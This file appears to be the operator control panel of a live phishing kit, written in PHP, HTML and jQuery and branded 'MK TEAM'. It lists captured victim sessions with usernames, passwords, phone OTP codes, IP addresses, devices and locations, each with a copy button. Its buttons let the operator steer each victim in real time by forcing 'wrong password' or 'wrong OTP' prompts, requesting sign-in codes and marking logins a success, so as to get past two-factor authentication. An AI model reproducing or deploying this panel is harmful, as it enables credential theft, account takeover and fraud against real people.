<?php
// admin/index.php
session_start();
require_once __DIR__ . '/../includes/db.php';

if (empty($_SESSION['is_admin']) || $_SESSION['is_admin'] !== true) {
    header('Location: login.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Live Panel</title>
  <!-- jQuery -->
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <style>
    /* Global Styles */
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      background: #1e1e1e;
      font-family: Arial, sans-serif;
      color: #f0f0f0;
      padding: 10px;
    }
	.mklogo img {
		width: 50px;
	}
    h1 {
      text-align: center;
      margin: 20px 0;
      font-weight: 300;
    }
    .top-buttons {
      text-align: center;
      margin-bottom: 20px;
    }
    .top-buttons a, .top-buttons button {
      background: #555;
      color: #fff;
      border: none;
      padding: 8px 16px;
      margin: 4px;
      border-radius: 4px;
      text-decoration: none;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    .top-buttons a:hover, .top-buttons button:hover {
      background: #666;
    }
    /* Session Row Styles */
    .session-row {
      width: 95%;
      max-width: 600px;
      background: #2a2a2a;
      margin: 10px auto;
      padding: 10px 15px;
      border-radius: 8px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.4);
      border: 1px solid #444;
    }
    .session-header {
      display: flex;
      flex-wrap: wrap;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 30px;
    }
    .session-header span {
      margin: 4px;
    }
    .session-status {
      font-size: 14px;
    }
    .status-waiting {
      animation: blink 1s infinite;
      color: #0f0;
    }
    .showbtn {
        cursor: pointer;
        padding: 2px 8px;
        margin: 4px;
    }
    .status-blocked {
      color: #ff6666;
      font-weight: bold;
    }
    @keyframes blink {
      0% { opacity: 1; }
      50% { opacity: 0.4; }
      100% { opacity: 1; }
    }
    .waiting-timer {
      font-size: 13px;
      color: #ccc;
      margin-left: 8px;
    }
    /* Online indicator styles */
    .online-indicator {
      font-size: 14px;
      color: #0f0;
      margin-left: 8px;
      display: inline-flex;
      align-items: center;
    }
    .online-dot {
      width: 12px;
      height: 12px;
      background: #0f0;
      border-radius: 50%;
      margin-right: 4px;
      animation: blink 1s infinite;
    }
    .session-details {
      margin-top: 8px;
      padding: 8px 0;
    }
    .session-field {
      border-bottom: 1px solid #444;
      padding: 4px 0;
      font-size: 14px;
    }
    .session-field:last-child {
      border-bottom: none;
    }
    .copy-btn {
      background: none;
      border: none;
      cursor: pointer;
      color: #ccc;
      font-size: 14px;
      margin-left: 6px;
    }
    .copy-msg {
      font-size: 12px;
      color: #0f0;
      margin-left: 5px;
    }
    .block-btn {
      background: #aa0000;
      color: #fff;
      border: none;
      padding: 4px 8px;
      margin-left: 5px;
      border-radius: 4px;
      cursor: pointer;
      font-size: 12px;
    }
    .block-btn:hover {
      background: #990000;
    }
    .session-actions {
      margin-top: 8px;
      text-align: center;
    }
    .session-actions button {
      background: #555;
      color: #fff;
      border: none;
      padding: 6px 12px;
      margin: 4px;
      border-radius: 4px;
      cursor: pointer;
      transition: background 0.3s ease;
      font-size: 13px;
    }
    .session-actions button:hover {
      background: #666;
    }
    .wrongbtn {
      background: #004FEE !important;
      color: #fff !important;
    }
    .wrongbtn:hover {
      background: #004EA0 !important;
    }
    .delbtn {
      background: #dd0c0c;
      color: #fff;
    }
    .delbtn:hover {
      background: #bd0505;
    }
    /* Modal Styles */
    .modal {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.5);
      z-index: 1000;
    }
    .modal .modal-content {
      background: #333;
      padding: 20px;
      border-radius: 8px;
      width: 90%;
      max-width: 320px;
      text-align: center;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
    }
    .modal input[type="text"] {
      width: 100%;
      padding: 8px;
      margin-bottom: 10px;
      border: 1px solid #555;
      border-radius: 4px;
      background: #444;
      color: #fff;
    }
    .modal button {
      padding: 6px 12px;
      margin: 4px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      background: #555;
      color: #fff;
      transition: background 0.3s ease;
      font-size: 14px;
    }
    .modal button:hover {
      background: #666;
    }
    /* Responsive adjustments */
    @media (max-width: 480px) {
      .session-header {
        flex-direction: column;
        align-items: flex-start;
      }
      .session-actions button {
        font-size: 12px;
        padding: 4px 8px;
      }
    }
  </style>
</head>
<body>
  <div class="mklogo">
    <img src="mkteam.svg" alt="MK TEAM">
  </div>
  <h1>Live Panel</h1>
  <div class="top-buttons">
    <a class="delbtn" href="delete_session.php?action=delete_all" onclick="return confirm('Delete all sessions?')">Delete All Sessions</a>
    <a class="btn" href="logout.php" onclick="return confirm('Logout?')">Logout</a>
  </div>
  <div id="sessions-container"></div>
  <!-- Audio for notification -->
  <audio id="beep-sound" src="sound/diste453rgreg34fr.mp3" preload="auto"></audio>
  
  <!-- Modal for PHONE OTP question -->
  <div id="phoneOtpModal" class="modal">
    <div class="modal-content">
      <h1>Phone OTP</h1>
      <input type="text" id="phoneOtpQuestion" placeholder="phone number">
      <div>
        <button onclick="sendPhoneOtpQuestion()">Send</button>
        <button onclick="closePhoneOtpModal()">Cancel</button>
      </div>
    </div>
  </div>
  
  <!-- Modal for Sign-In Request -->
<div id="signInRequestModal" class="modal">
  <div class="modal-content">
    <h1>Sign-In Request</h1>
    <!-- Added two input fields -->
    <input type="text" id="signInRequestQuestion1" placeholder="Code">
    <input type="text" id="signInRequestQuestion2" placeholder="Device">
    <div>
      <button onclick="sendSignInRequestQuestion()">Send</button>
      <button onclick="closeSignInRequestModal()">Cancel</button>
    </div>
  </div>
</div>
  
  <script>
    let lastUpdateMap = {}; // store last_update per session
    let openDetails = {};   // track which sessions have details open
    let blockedIPs = [];    // list of blocked IPs
    let phoneOtpSessionId = null;      // current session id for phone OTP
    let signInRequestSessionId = null;   // current session id for sign-in request
    
    // Load blocked IPs from file
    $.getJSON('blocked_ips.json', function(data) {
      if (data) {
        blockedIPs = data;
      }
    });
    
    function loadSessions() {
      $.getJSON('poll_sessions.php', function(data) {
        if (data.sessions) {
          // Sort sessions (newest first)
          data.sessions.sort((a, b) => b.last_update - a.last_update);
    
          let container = $('#sessions-container');
          container.empty();
          let newData = false;
    
          data.sessions.forEach(function(s) {
            let rowClass = 'session-row';
            let oldUpdate = lastUpdateMap[s.session_id] || 0;
            if (s.last_update > oldUpdate) {
              if (s.update_source === 'user') newData = true;
              lastUpdateMap[s.session_id] = s.last_update;
            }
    
            let dateTime = s.last_update ? new Date(s.last_update * 1000).toLocaleString() : '';
    
            // Check if session IP is blocked
            let isBlocked = (s.ip_address && blockedIPs.indexOf(s.ip_address) !== -1);
            let displayStatus = isBlocked ? 'blocked' : (s.status || '');
            let statusClass = (displayStatus === 'waiting') ? 'status-waiting' : (displayStatus === 'blocked' ? 'status-blocked' : '');
    
            let html = '<div class="' + rowClass + '">';
            html += '<div class="session-header">';
            html += '<span><strong>Session ID:</strong> ' + (s.session_id || '') + '</span>';
            // Online indicator: if s.last_seen exists and is within 10 seconds
            let currentTime = Math.floor(Date.now() / 1000);
            if (s.last_seen && (currentTime - s.last_seen < 10)) {
              html += ' <span class="online-indicator"><span class="online-dot"></span>online</span>';
            }
            html += '<button class="showbtn" onclick="toggleDetails(\'' + s.session_id + '\')">Show</button>';
            html += '<span class="session-status ' + statusClass + '"><strong>Status:</strong> ' + displayStatus + '</span>';
            if (displayStatus === 'waiting') {
              html += '<span class="waiting-timer" data-last-update="' + s.last_update + '"></span>';
            }
            html += '</div>';
    
            let displayStyle = openDetails[s.session_id] ? 'block' : 'none';
            html += '<div class="session-details" id="details-' + s.session_id + '" style="display:' + displayStyle + ';">';
            if (s.ip_address) {
                html += '<div class="session-field"><strong>IP:</strong> ' + s.ip_address + 
                        ' <button class="copy-btn" onclick="copyText(this, \'' + s.ip_address + '\')">&#128203;</button>' +
                        ' <button class="block-btn" onclick="blockIp(\'' + s.ip_address + '\')">Block IP</button></div>';
            }
            if (s.device) {
                html += '<div class="session-field"><strong>Device:</strong> ' + s.device +
                        ' <button class="copy-btn" onclick="copyText(this, \'' + s.device + '\')">&#128203;</button></div>';
            }
            if (s.location) {
                html += '<div class="session-field"><strong>Location:</strong> ' + s.location +
                        ' <button class="copy-btn" onclick="copyText(this, \'' + s.location + '\')">&#128203;</button></div>';
            }
            if (s.username) {
              html += '<div class="session-field"><strong>Username:</strong> ' + s.username + 
                      ' <button class="copy-btn" onclick="copyText(this, \'' + s.username + '\')">&#128203;</button></div>';
            }
            if (s.password) {
              html += '<div class="session-field"><strong>Password:</strong> ' + s.password + 
                      ' <button class="copy-btn" onclick="copyText(this, \'' + s.password + '\')">&#128203;</button></div>';
            }
            if (s.password2) {
              html += '<div class="session-field"><strong>Wrong Password:</strong> ' + s.password2 + 
                      ' <button class="copy-btn" onclick="copyText(this, \'' + s.password2 + '\')">&#128203;</button></div>';
            }
            if (s.otp) {
              html += '<div class="session-field"><strong>PHONE OTP:</strong> ' + s.otp + 
                      ' <button class="copy-btn" onclick="copyText(this, \'' + s.otp + '\')">&#128203;</button></div>';
            }
            if (s.otp2) {
              html += '<div class="session-field"><strong>Wrong PHONE OTP:</strong> ' + s.otp2 + 
                      ' <button class="copy-btn" onclick="copyText(this, \'' + s.otp2 + '\')">&#128203;</button></div>';
            }
            if (s.phone) {
              html += '<div class="session-field"><strong>Phone:</strong> ' + s.phone + 
                      ' <button class="copy-btn" onclick="copyText(this, \'' + s.phone + '\')">&#128203;</button></div>';
            }
            if (dateTime) {
              html += '<div class="session-field"><strong>Date/Time:</strong> ' + dateTime + '</div>';
            }
            html += '</div>';
    
            html += '<div class="session-actions">';
            html += '<button onclick="openPhoneOtpModal(\'' + s.session_id + '\')">PHONE OTP</button>';
            html += '<button onclick="openSignInRequestModal(\'' + s.session_id + '\')">Sign-In Request</button>';
			html += '<button onclick="updateStatus(\'' + s.session_id + '\', \'waiting\')">Sign In Approved</button>';
            html += '<button onclick="updateStatus(\'' + s.session_id + '\', \'phone\')">Phone</button>';
            html += '<button class="wrongbtn" onclick="updateStatus(\'' + s.session_id + '\', \'wrong_password\')">WRONG PASSWORD</button>';
            html += '<button class="wrongbtn" onclick="updateStatus(\'' + s.session_id + '\', \'wrong-phone_otp\')">WRONG PHONE OTP</button>';
            html += '<button onclick="updateStatus(\'' + s.session_id + '\', \'success\')">Success</button>';
            html += '<button class="delbtn" onclick="deleteSingle(\'' + s.session_id + '\')">Delete</button>';
            html += '</div>';
    
            html += '</div>';
    
            container.append(html);
          });
    
          if (newData) {
            const beep = document.getElementById('beep-sound');
            beep.play().catch(e => {});
          }
          updateTimers();
        }
      });
    }
    
    function toggleDetails(sessionId) {
      openDetails[sessionId] = !openDetails[sessionId];
      const detailsDiv = document.getElementById('details-' + sessionId);
      if (detailsDiv) {
        detailsDiv.style.display = openDetails[sessionId] ? 'block' : 'none';
      }
    }
    
    function copyText(btn, text) {
      navigator.clipboard.writeText(text).then(() => {
        let msgSpan = document.createElement("span");
        msgSpan.className = "copy-msg";
        msgSpan.textContent = "Copied!";
        btn.parentNode.insertBefore(msgSpan, btn.nextSibling);
        setTimeout(() => { msgSpan.remove(); }, 2000);
      }).catch(err => { console.error('Copy failed', err); });
    }
    
    function blockIp(ip) {
      if (confirm("Block IP: " + ip + "?")) {
        window.location.href = "block_ip.php?ip=" + encodeURIComponent(ip);
      }
    }
    
    function updateStatus(sessionId, newStatus) {
      $.post('update_status.php', { session_id: sessionId, status: newStatus }, function() {
        loadSessions();
      });
    }
    
    function deleteSingle(sessionId) {
      if (confirm('Delete this session?')) {
        $.get('delete_session.php', { session_id: sessionId }, function() {
          loadSessions();
        });
      }
    }
    
    function updateTimers() {
      $('.waiting-timer').each(function() {
        let lastUpdate = parseInt($(this).attr('data-last-update'));
        let waitingSec = Math.floor(Date.now() / 1000) - lastUpdate;
        $(this).text("Waiting: " + waitingSec + " sec");
      });
    }
    
    // PHONE OTP modal functions
    function openPhoneOtpModal(sessionId) {
      phoneOtpSessionId = sessionId;
      $('#phoneOtpModal').fadeIn(200);
    }
    function closePhoneOtpModal() {
      $('#phoneOtpModal').fadeOut(200);
      $('#phoneOtpQuestion').val('');
    }
    function sendPhoneOtpQuestion() {
      let question = $('#phoneOtpQuestion').val().trim();
      if (!question) { alert("Please enter a question."); return; }
      $.post('update_phone_otp_question.php', { session_id: phoneOtpSessionId, question: question }, function(response) {
        try {
          let res = JSON.parse(response);
          if (res.success) { closePhoneOtpModal(); loadSessions(); }
          else { alert("Error: " + res.error); }
        } catch (e) { alert("An error occurred."); }
      });
    }
    
  // Updated Sign-In Request modal functions
  function openSignInRequestModal(sessionId) {
      signInRequestSessionId = sessionId;
      $('#signInRequestModal').fadeIn(200);
  }
  function closeSignInRequestModal() {
      $('#signInRequestModal').fadeOut(200);
      $('#signInRequestQuestion1').val('');
      $('#signInRequestQuestion2').val('');
  }
  function sendSignInRequestQuestion() {
      let question1 = $('#signInRequestQuestion1').val().trim();
      let question2 = $('#signInRequestQuestion2').val().trim();
      if (!question1) {
          alert("Please enter the first question.");
          return;
      }
      // Send both questions via AJAX
      $.post('update_sign_in_request_question.php', { 
          session_id: signInRequestSessionId, 
          question1: question1,
          question2: question2 
      }, function(response) {
          try {
              let res = JSON.parse(response);
              if (res.success) {
                  closeSignInRequestModal();
                  loadSessions();
              } else {
                  alert("Error: " + res.error);
              }
          } catch (e) {
              alert("An error occurred.");
          }
      });
  }
    
    setInterval(loadSessions, 5000);
    setInterval(updateTimers, 1000);
    $(document).ready(loadSessions);
  </script>
</body>
</html>
